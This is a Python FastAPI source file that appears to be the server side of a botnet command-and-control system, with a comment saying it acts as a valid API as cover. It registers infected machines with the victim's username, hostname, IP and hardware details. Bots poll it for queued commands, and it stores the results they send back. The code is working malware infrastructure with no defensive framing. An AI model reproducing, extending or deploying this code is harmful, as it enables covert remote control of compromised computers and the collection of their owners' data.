from fastapi import Request, APIRouter, status, HTTPException
from fastapi.responses import Response
from config import SystemDetails, CommandResult
from database.bot import create_new_bot
from database.dbmain import get_connection_pool

router = APIRouter(prefix="/api/v1") # act as valid api

# bot send its status (polling)
@router.post("/beacon/{token}")
async def report_status(token: str):
    async with (await get_connection_pool()).acquire() as conn:
        try:
            # check if bot is exist
            bot = await conn.fetchrow("SELECT * FROM bots WHERE token = $1", token)
            if not bot:
                return Response(status_code=status.HTTP_400_BAD_REQUEST)
            
            bot_id = bot["id"]
            # update bot's status is online
            await conn.execute("UPDATE bots SET status = $1 WHERE id = $2", "online", bot_id)

            # check if there is a command in pending
            command = await conn.fetchrow(
                """
                SELECT * FROM commands
                WHERE bot_id = $1
                AND status = 'pending'
                ORDER BY issued_at ASC
                LIMIT 1
                """,
                bot_id
            )
            # if there is, send it to bot
            if command:
                command_txt = command["command"]
                command_id = command["id"]

                # mark as processed
                await conn.execute(
                    "UPDATE commands SET status = $1 WHERE id = $2",
                    "processed", command_id
                )
                return Response(content=command_txt, status_code=status.HTTP_200_OK, media_type="text/plain")
            return Response(status_code=status.HTTP_204_NO_CONTENT)
        except Exception as e:
            raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail=f"Exception {str(e)}")

# bot send result of command from c2 server
@router.post("/result/{token}")
async def report_result(token: str, cmd_result: CommandResult):
    async with (await get_connection_pool()).acquire() as conn:
        try:
            # check if bot is exist
            bot = await conn.fetchrow("SELECT * FROM bots WHERE token = $1", token)
            if not bot:
                return Response(status_code=status.HTTP_400_BAD_REQUEST)
            bot_id = bot["id"]
            command = cmd_result.command
            result = cmd_result.result

            if not command or not result:
                return Response(status_code=status.HTTP_400_BAD_REQUEST)

            print(f"{command} - {result}")

            command_record = await conn.fetchrow(
                """
                SELECT * FROM commands
                WHERE bot_id = $1 AND command = $2 AND status = 'processed'
                ORDER BY issued_at DESC
                LIMIT 1
                """,
                bot_id, command
            )
            command_id = command_record["id"] if command_record else None

            # save into logs table
            await conn.execute(
                """
                INSERT INTO logs (bot_id, command_id, result)
                VALUES ($1, $2, $3)
                """,
                bot_id, command_id, result
            )
            return Response(status_code=status.HTTP_200_OK)

        except Exception as e:
            raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail=f"Error processing result: {str(e)}")

@router.post("/sysinfo/{token}", status_code=status.HTTP_204_NO_CONTENT)
async def receive_sysinfo(request: Request, token: str, details: SystemDetails):
    ip = request.client.host
    username = details.username
    hostname = details.hostname
    os = details.os
    cpu = details.cpu
    gpu = details.gpu
    ram = details.ram
    disk = details.disk

    if (await create_new_bot(token, username, hostname, ip, os, cpu, gpu, ram, disk)):
        print("create new bot success!")
    else:
        print("create new bot fail!")